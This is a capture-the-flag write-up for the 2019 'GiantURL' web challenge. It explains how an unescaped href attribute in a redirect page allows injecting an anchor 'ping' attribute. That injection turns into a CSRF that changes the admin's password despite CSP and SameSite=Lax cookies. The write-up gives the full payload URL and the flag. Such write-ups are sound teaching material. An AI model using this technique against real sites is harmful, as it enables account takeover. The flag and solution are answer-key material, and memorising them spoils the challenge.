GiantURL
We have a website where we can:
- create redirect URL GET /redirect
- change admin's password POST /admin/changepass
- report URL POST /report
The website is not protected by any CSRF tokens but the SameSite=Lax cookie is set so we can't do any POST requests across different origins.
php
<?php
if ($path === '/admin/changepass' && $_SERVER['REQUEST_METHOD'] === 'POST' && $_SESSION["admin"] === "true") {
    if (strlen($_REQUEST['password']) >= 100 && count(array_unique(str_split($_REQUEST['password']))) > 10) {
        $password = $_REQUEST['password'];
        echo 'Successfully changed password.';
    } else {
        echo 'Password is insecure.';
    }
}
file_put_contents("password", $password);
?>

In order to get the flag we have to somehow change the admin's password. We can see that it must be a POST request but the password can be passed as a URL parameter.
In the /redirect we have a vulnerable code:
php
Click on <a href=<?php echo htmlspecialchars($_REQUEST['url']); ?>>this link</a> to go to your page!

In theory we could insert the xss there, like for example: <a href=aa onclick=alert()>this link</a> but CSP will block such attempts because of the
Content-Security-Policy: default-src 'self'; style-src 'unsafe-inline'; header.
However, there is a ping feature in <a> elements that sends a POST request when the link was clicked. So we can insert <a href=aa ping="/admin/changepass?password=LONG_PASSWORD">this link</a> in the /redirect and then when the admin clicks on that URL their password will change. The full payload:

https://giant_url.2019.chall.actf.co/redirect?url=aa%20ping=/admin/changepass?password=0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a

After that we can log in using the new credentials and we get the flag: 
actf{p1ngp0ng9b05891fa9c3bed74d02a349877b1c60}
